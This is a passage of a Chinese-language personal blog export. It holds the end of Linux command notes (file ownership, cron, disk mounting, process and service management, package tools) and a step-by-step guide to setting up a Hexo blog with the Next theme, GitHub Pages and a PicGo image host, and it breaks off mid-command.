<h3 id="修改文件所有者chown"><a href="#修改文件所有者chown" class="headerlink" title="修改文件所有者chown"></a>修改文件所有者chown</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown  newowner  file  改变文件的所有者</span><br><span class="line">chown  newowner:newgroup  file  改变用户的所有者和所有组</span><br><span class="line">-R   如果是目录 则使其下所有子文件或目录递归生效</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home/abc.txt 文件的所有者修改成 tom</span></span><br><span class="line">chown   tom  /home/abc.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home/kkk 目录下所有的文件和目录的所有者都修改成tom</span></span><br><span class="line">chown –R tom  /home/kkk</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将home下的所有文件和目录的所有者都改成 tom，将所在组改成police</span></span><br><span class="line">chown –R  tom:police   /home/ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="修改文件所有组chgrp"><a href="#修改文件所有组chgrp" class="headerlink" title="修改文件所有组chgrp"></a>修改文件所有组chgrp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chgrp newgroup file  改变文件的所有组</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home/abc .txt 文件的所在组修改成 shaolin (少林)</span></span><br><span class="line">chgrp  shaolin  /home/abc.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将 /home/kkk 目录下所有的文件和目录的所在组都修改成 shaolin(少林)</span></span><br><span class="line">chgrp  -R  shaolin /home/kkk </span><br></pre></td></tr></table></figure>

<h3 id="crond任务调度"><a href="#crond任务调度" class="headerlink" title="crond任务调度"></a>crond任务调度</h3><p> <strong>基本语法</strong></p>
<p>   crontab [选项]</p>
<p> <strong>常用选项</strong></p>
<table>
<thead>
<tr>
<th>-e</th>
<th>编辑crontab定时任务</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>查询crontab任务</td>
</tr>
<tr>
<td>-r</td>
<td>删除当前用户所有的crontab任务</td>
</tr>
</tbody></table>
<p>快速入门</p>
<p>   设置任务调度文件：&#x2F;etc&#x2F;crontab</p>
<p>   设置个人任务调度。执行crontab –e命令。</p>
<p>​    接着输入任务到调度文件<br>​    如：*&#x2F;1 * * * * ls –l &#x2F;etc&#x2F; &gt; &#x2F;tmp&#x2F;to.txt  </p>
<p>​    意思说每小时的每分钟执行 ls –l &#x2F;etc&#x2F; &gt; &#x2F;tmp&#x2F;to.txt命令</p>
<p>参数细节说明</p>
<p>5个占位符的说明</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>含义</th>
<th>范围</th>
</tr>
</thead>
<tbody><tr>
<td>第一个“*”</td>
<td>一小时当中的第几分钟</td>
<td>0-59</td>
</tr>
<tr>
<td>第二个“*”</td>
<td>一天当中的第几小时</td>
<td>0-23</td>
</tr>
<tr>
<td>第三个“*”</td>
<td>一个月当中的第几天</td>
<td>1-31</td>
</tr>
<tr>
<td>第四个“*”</td>
<td>一年当中的第几月</td>
<td>1-12</td>
</tr>
<tr>
<td>第五个“*”</td>
<td>一周当中的星期几</td>
<td>0-7（0和7都代表星期日）</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>特殊符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>代表任何时间。比如第一个“*”就代表一小时中每分钟都执行一次的意思。</td>
</tr>
<tr>
<td>，</td>
<td>代表不连续的时间。比如“0  8,12,16 * * * 命令”，就代表在每天的8点0分，12点0分，16点0分都执行一次命令</td>
</tr>
<tr>
<td>-</td>
<td>代表连续的时间范围。比如“0  5 *   * 1-6命令”，代表在周一到周六的凌晨5点0分执行命令</td>
</tr>
<tr>
<td>*&#x2F;n</td>
<td>代表每隔多久执行一次。比如“*&#x2F;10 *   * * * 命令”，代表每隔10分钟就执行一遍命令</td>
</tr>
</tbody></table>
<h2 id="Linux磁盘分区、挂载"><a href="#Linux磁盘分区、挂载" class="headerlink" title="Linux磁盘分区、挂载"></a>Linux磁盘分区、挂载</h2><ul>
<li>mbr分区:</li>
</ul>
<p>1.最多支持四个主分区</p>
<p>2.系统只能安装在主分区</p>
<p>3.扩展分区要占一个主分区</p>
<p>4.MBR最大只支持2TB，但拥有最好的兼容性</p>
<ul>
<li>gtp分区:</li>
</ul>
<p>1.支持无限多个主分区（但操作系统可能限制，比如 windows下最多128个分区）</p>
<p>2.最大支持18EB的大容量（1EB&#x3D;1024 PB，1PB&#x3D;1024 TB ）</p>
<p>3.windows7 64位以后支持gtp</p>
<p>原理介绍</p>
<p>1)Linux来说无论有几个分区，分给哪一目录使用，它归根结底就只有一个根目录，一个独立且唯一的文件结构 , Linux中每个分区都是用来组成整个文件系统的一部分。</p>
<p>2)Linux采用了一种叫“载入”的处理方法，它的整个文件系统中包含了一整套的文件和目录，且将一个分区和一个目录联系起来。这时要载入的一个分区将使它的存储空间在一个目录下获得。</p>
<p>硬盘说明</p>
<p>1)Linux硬盘分IDE硬盘和SCSI硬盘，目前基本上是SCSI硬盘</p>
<p>2)对于IDE硬盘，驱动器标识符为“hdx”,其中“hd”表明分区所在设备的类型，这里是指IDE硬盘了。“x”为盘号（a为基本盘，b为基本从属盘，c为辅助主盘，d为辅助从属盘）,“”代表分区，前四个分区用数字1到4表示，它们是主分区或扩展分区，从5开始就是逻辑分区。例，hda3表示为第一个IDE硬盘上的第三个主分区或扩展分区,hdb2表示为第二个IDE硬盘上的第二个主分区或扩展分区。</p>
<p>3)对于SCSI硬盘则标识为“sdx~”，SCSI硬盘是用“sd”来表示分区所在设备的类型的，其余则和IDE硬盘的表示方法一样。sdb1 [表示第2块scsi 硬盘的第1个分区]</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211829424.png" alt="image-20211019193102040"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">查看所有设备的挂载情况 list block</span></span><br><span class="line">lsblk -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">分区命令</span></span><br><span class="line">fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">开始对/sdb分区</span><br><span class="line">m   显示命令列表</span><br><span class="line">p    显示磁盘分区 同 fdisk  –l</span><br><span class="line">n    新增分区</span><br><span class="line">d    删除分区</span><br><span class="line">w   写入并退出</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">格式化磁盘 ext4是分区类型 make file system</span></span><br><span class="line">mkfs -t ext4 /dev/sdb1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">挂载 用命令行挂载重启后会失效</span></span><br><span class="line">mount /dev/sdb1 /home/newdisk</span><br><span class="line">umount /dev/sdb1 或者 umount /home/newdisk</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">永久挂载</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">mount -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">磁盘情况查询 disk free</span></span><br><span class="line">df -h</span><br><span class="line"></span><br><span class="line">du -h  /目录</span><br><span class="line">   -s 指定目录占用大小汇总</span><br><span class="line">   -h 带计量单位</span><br><span class="line">   -a 含文件</span><br><span class="line">   --max-depth=1  子目录深度</span><br><span class="line">   -c 列出明细的同时，增加汇总值</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">查询 /usr目录的磁盘占用情况，深度为1</span></span><br><span class="line">du  -ach  --max-depth=1  /usr</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">统计/home文件夹下文件的个数</span></span><br><span class="line">ls -la /home/ | grep &quot;^-&quot; | wc -l</span><br><span class="line"><span class="meta">#</span><span class="language-bash">统计/home 文件夹下目录的个数，包括子文件夹里的</span></span><br><span class="line">ls -lr /home/ | grep &quot;^d&quot; | wc -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">以树状显示 home 目录结构</span></span><br><span class="line">yum install tree</span><br><span class="line">tree /home</span><br></pre></td></tr></table></figure>

<h2 id="Linux的网络配置"><a href="#Linux的网络配置" class="headerlink" title="Linux的网络配置"></a>Linux的网络配置</h2><p>在&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0(确认ONBOOT&#x3D;yes),其中eth0是设备名<br>ONBOOT是指明在系统启动时是否激活网卡，只有在激活状态的网卡才能去连接网络，进行网络通讯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改网卡配置</span></span><br><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改网关配置</span></span><br><span class="line">vi /etc/sysconfig/network</span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改DNS配置</span></span><br><span class="line">vi /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">显示所有的进程</span></span><br><span class="line">ps -aux</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">以全格式显示当前所有的进程，查看进程的父进程</span></span><br><span class="line">ps -ef</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">踢掉某个非法登录用户【jack】</span></span><br><span class="line">ps -aux | grep sshd</span><br><span class="line">kill -9 </span><br><span class="line"><span class="meta"># </span><span class="language-bash">终止远程登录服务 sshd, 在适当时候再次重启 sshd 服务</span></span><br><span class="line">service sshd start</span><br><span class="line"><span class="meta"># </span><span class="language-bash">终止多个gedit编辑器</span></span><br><span class="line">killall gedit</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">强行杀掉一个终端</span></span><br><span class="line">kill -9 对应的bash的进程号</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">sevice 管理</span></span><br><span class="line">service 服务名 [start | stop | restart | reload | status] </span><br><span class="line"><span class="meta">#</span><span class="language-bash">在 CentOS7.0 后 不再使用 service ,而是 systemctl</span></span><br><span class="line">systemctl [start | stop | restart | reload | status] 服务名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">列举系统有哪些服务</span></span><br><span class="line">ls -l /etc/init.d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">check config</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">通过chkconfig 命令可以给每个服务的各个运行级别设置自启动/关闭</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">显示当前系统所有服务的各个运行级别的运行状态</span> </span><br><span class="line">chkconfig --list</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看sshd服务的运行状态</span></span><br><span class="line">chkconfig sshd –list 或者 chkconfig –list | grep sshd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">将sshd 服务在运行级别5下设置为不自动启动，看看有什么效果？</span></span><br><span class="line">chkconfig –level 5 sshd off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">当运行级别为5时，关闭防火墙。</span></span><br><span class="line">chkconfig –level 5 iptables off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在所有运行级别下，关闭防火墙</span></span><br><span class="line">chkconfig iptables off</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在所有运行级别下，开启防火墙</span></span><br><span class="line">chkconfig  iptables on</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用细节</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">chkconfig重新设置服务后自启动或关闭，重启机器就会按设置的状态运行.</span>   </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不小心将默认的运行级别设置成 0 或者 7 ，怎么处理？</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">进入单用户模式，修改成正常的即可</span></span><br></pre></td></tr></table></figure>

<p>ps详解</p>
<p>1)指令：ps –aux|grep xxx ，比如我看看有没有sshd服务</p>
<p>2)指令说明</p>
<p>•System V展示风格</p>
<p>•USER：用户名称</p>
<p>•PID：进程号 </p>
<p>•%CPU：进程占用CPU的百分比 </p>
<p>•%MEM：进程占用物理内存的百分比 </p>
<p>•VSZ：进程占用的虚拟内存大小（单位：KB）Virtual Memory Size </p>
<p>•RSS：进程占用的物理内存大小（单位：KB）Resident Set Size</p>
<p>•TTY：终端名称,缩写 Teletypewriter </p>
<p>•STAT：进程状态，其中S-睡眠，s-表示该进程是会话的先导进程，N-表示进程拥有比普通优先级更低的优先级，R-正在运行，D-短期等待，Z-僵死进程，T-被跟踪或者被停止等等</p>
<p>•STARTED：进程的启动时间</p>
<p>•TIME：CPU时间，即进程使用CPU的总时间</p>
<p>COMMAND：启动进程所用的命令和参数，如果过长会被截断显示</p>
<h3 id="Shell和Bash"><a href="#Shell和Bash" class="headerlink" title="Shell和Bash"></a>Shell和Bash</h3><p>学习 Bash，首先需要理解 Shell 是什么。Shell 这个单词的原意是“外壳”，跟 kernel（内核）相对应，比喻内核外面的一层，即用户跟内核交互的对话界面。</p>
<p>具体来说，Shell 这个词有多种含义。</p>
<p>首先，Shell 是一个程序，提供一个与用户对话的环境。这个环境只有一个命令提示符，让用户从键盘输入命令，所以又称为命令行环境（command line interface，简写为 CLI）。Shell 接收到用户输入的命令，将命令送入操作系统执行，并将结果返回给用户。本书中，除非特别指明，Shell 指的就是命令行环境。</p>
<p>其次，Shell 是一个命令解释器，解释用户输入的命令。它支持变量、条件判断、循环操作等语法，所以用户可以用 Shell 命令写出各种小程序，又称为脚本（script）。这些脚本都通过 Shell 的解释执行，而不通过编译。</p>
<p>最后，Shell 是一个工具箱，提供了各种小工具，供用户方便地使用操作系统的功能。</p>
<p>Shell 有很多种，只要能给用户提供命令行环境的程序，都可以看作是 Shell。</p>
<p>历史上，主要的 Shell 有下面这些。</p>
<ul>
<li>Bourne Shell（sh）</li>
<li>Bourne Again shell（bash）</li>
<li>C Shell（csh）</li>
<li>TENEX C Shell（tcsh）</li>
<li>Korn shell（ksh）</li>
<li>Z Shell（zsh）</li>
<li>Friendly Interactive Shell（fish）</li>
</ul>
<p>Bash 是目前最常用的 Shell，除非特别指明，下文的 Shell 和 Bash 当作同义词使用，可以互换。</p>
<p>下面的命令可以查看当前运行的 Shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo $SHELL</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<p>下面的命令可以查看当前的 Linux 系统安装的所有 Shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /etc/shells</span><br></pre></td></tr></table></figure>

<p>上面两个命令中，<code>$</code>是命令行环境的提示符，用户只需要输入提示符后面的内容。</p>
<p>Linux 允许每个用户使用不同的 Shell，用户的默认 Shell 一般都是 Bash，或者与 Bash 兼容。</p>
<p>根用户（root）的提示符，不以美元符号（<code>$</code>）结尾，而以井号（<code>#</code>）结尾，用来提醒用户，现在具有根权限，可以执行各种操作，务必小心，不要出现误操作。这个符号是可以自己定义的</p>
<p>进入命令行环境以后，一般就已经打开 Bash 了。如果你的 Shell 不是 Bash，可以输入<code>bash</code>命令启动 Bash。</p>
<h3 id="动态监控进程"><a href="#动态监控进程" class="headerlink" title="动态监控进程"></a>动态监控进程</h3><p> top与ps命令很相似。它们都用来显示正在执行的进程。Top与ps最大的不同之处，在于top在执行一段时间可以更新正在运行的的进程(默认每3秒变化一次)。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>-d  秒数</td>
<td>指定top命令每隔几秒更新。默认是3秒在top命令的交互模式当中可以执行的命令：</td>
</tr>
<tr>
<td>-i</td>
<td>使top不显示任何闲置或者僵死进程。</td>
</tr>
<tr>
<td>-p</td>
<td>通过指定监控进程ID来仅仅监控某个进程的状态。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>操作</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>P</td>
<td>以CPU使用率排序，默认就是此项</td>
</tr>
<tr>
<td>M</td>
<td>以内存的使用率排序</td>
</tr>
<tr>
<td>N</td>
<td>以PID排序</td>
</tr>
<tr>
<td>q</td>
<td>退出top</td>
</tr>
</tbody></table>
<p>案例1.如何监视特定用户<br> top：输入此命令，按回车键，查看执行的进程。<br> u：然后输入“u”回车，再输入用户名，即可</p>
<p>案例2：如何终止指定的进程。<br> top：输入此命令，按回车键，查看执行的进程。<br> k：然后输入“k”回车，再输入要结束的进程ID号</p>
<p>案例3:指定系统状态更新的时间(每隔10秒自动更新)</p>
<h3 id="监控网络服务"><a href="#监控网络服务" class="headerlink" title="监控网络服务"></a>监控网络服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anp</span><br><span class="line">-an  按一定顺序排列输出</span><br><span class="line">-p  显示哪个进程在调用</span><br></pre></td></tr></table></figure>

<h3 id="RPM包管理"><a href="#RPM包管理" class="headerlink" title="RPM包管理"></a>RPM包管理</h3><p>一种用于互联网下载包的打包及安装工具，它包含在某些Linux分发版中。它生成具有.RPM扩展名的文件。RPM是RedHat Package Manager（RedHat软件包管理工具）的缩写，类似windows的setup.exe，这一文件格式名称虽然打上了RedHat的标志，但理念是通用的。</p>
<p>Linux的分发版本都有采用（suse,redhat, centos 等等），可以算是公认的行业标准了。</p>
<p>rpm包的简单查询指令：</p>
<p>查询已安装的rpm列表 rpm –qa|grep xx</p>
<p>rpm -qa | grep firefox</p>
<p>安装rpm包：</p>
<p>•基本语法</p>
<p>rpm -ivh RPM包全路径名称</p>
<p>•参数说明</p>
<p> i&#x3D;install 安装</p>
<p>  v&#x3D;verbose 提示</p>
<p>  h&#x3D;hash 进度条</p>
<p>•应用实例</p>
<p>1)演示卸载和安装firefox浏览器</p>
<p>提示：很多的rpm包，就在我们的centos安装的镜像文件中</p>
<h3 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h3><p>Yum 是一个<a href="https://baike.baidu.com/item/Shell">Shell</a> 软件包<strong>管理器</strong>。基于<a href="https://baike.baidu.com/item/RPM">RPM</a>包管理，能够从指定</p>
<p>的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并</p>
<p>且一次安装所有依赖的软件包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">查端口占用</span></span><br><span class="line">netstat -tunlp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">io 读写</span></span><br><span class="line">iotop</span><br></pre></td></tr></table></figure>

<p>Linux cat 命令Linux 命令大全cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>常用命令</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客</title>
    <url>/2021/12/29/Chaos/%E9%98%BF%E9%87%8C%E4%BA%91+Typora+PicGo+Github+Hexo+Next%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="阿里云-Typora-PicGo-Github-Hexo-Next主题搭建个人博客"><a href="#阿里云-Typora-PicGo-Github-Hexo-Next主题搭建个人博客" class="headerlink" title="阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客"></a>阿里云+Typora+PicGo+Github+Hexo+Next主题搭建个人博客</h1><ul>
<li>开通阿里云对象存储</li>
<li>下载Typora</li>
<li>下载Picgo</li>
<li>typora配置图片通过picgo上传</li>
<li>picgo配置阿里云的secretKey和secretId</li>
<li>安装hexo（需要先安装nodejs）</li>
<li>github新建仓库</li>
<li>Hexo配置发布到github或个人服务器（需要配置）</li>
<li>修改主题</li>
</ul>
<p>安装homebrew</p>
<h2 id="安装PicGo"><a href="#安装PicGo" class="headerlink" title="安装PicGo"></a>安装PicGo</h2><p><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
<p>配置阿里云图床</p>
<h2 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install node</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">github创建一个仓库</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装git</span></span><br><span class="line">brew install git</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;你的GitHub用户名&quot;</span><br><span class="line">git config --global user.email &quot;你的GitHub注册邮箱&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">然后直接三个回车即可，默认不需要设置密码</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制到github</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">访问不了github， 要翻墙</span></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line"></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive hexo-generator-searchdb</span><br><span class="line"></span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexo clean </span><br><span class="line">hexo g </span><br><span class="line">hexo d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">github生成token，密码填token</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">生成Token的时候要设置权限</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">设置主题</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">修改配置文件blog/_config.yml</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Site</span></span><br><span class="line">title: YeChun</span><br><span class="line">subtitle: &#x27;I love mw.&#x27;</span><br><span class="line">description: &#x27;朝花夕拾 聊以记之&#x27;</span><br><span class="line">keywords:</span><br><span class="line">author: YeChunChen</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: &#x27;Asia/Shanghai&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">theme: next</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/pure-cyc/pure-cyc.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">设置主题</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">clash重新设置代理</span></span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">配置next/_config.yml</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Remove unnecessary files after hexo generate.</span></span><br><span class="line">minify: true</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Schemes</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Muse</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Mist</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">about: /about/ || fa fa-user</span></span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/pure-cyc || fab fa-github</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">E-Mail: mailto:@gmail.com || fa fa-envelope</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line">  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Mermaid tag</span></span><br><span class="line">mermaid:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Available themes: default | dark | forest | neutral</span></span><br><span class="line">  theme:</span><br><span class="line">    light: default</span><br><span class="line">    dark: dark</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">开启search</span></span><br><span class="line">npm install hexo-generator-searchdb</span><br><span class="line"><span class="meta"># </span><span class="language-bash">blog/_config.yml</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br><span class="line">  format: html</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">next/——config.yml</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Local search</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Dependencies: https://github.com/next-theme/hexo-generator-searchdb</span></span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">If auto, trigger search by changing input.</span></span><br><span class="line"><span class="meta">  # </span><span class="language-bash">If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  trigger: auto</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Unescape html strings to the readable one.</span></span><br><span class="line">  unescape: false</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Preload the search data when the page loads.</span></span><br><span class="line">  preload: false</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">绑定域名</span></span><br><span class="line">cd blog/source</span><br><span class="line">vi CNAME</span><br><span class="line">blog.yc0623.asia</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">编写脚本debug.sh</span></span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s --debug</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">把本地blog上传到github</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">github创建仓库blog</span></span><br><span class="line">cd blog</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git rm -f --cached themes/next</span><br><span class="line">git submodule add https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta"># </span><span class="language-bash">将本地项目与远程仓库关联</span></span><br><span class="line">git remote add origin https://github.com/pure-cyc/blog.git</span><br><span class="line"><span class="meta"># </span><span class="language-bash">第一次提交需要-u，该-u标志添加了对您推送到的上游服务器的跟踪引用。</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">一旦你做了一个git push -u origin master，你可以稍后调用git pull，git 就会知道你实际上是指git pull origin master.</span></span><br><span class="line">git push -u 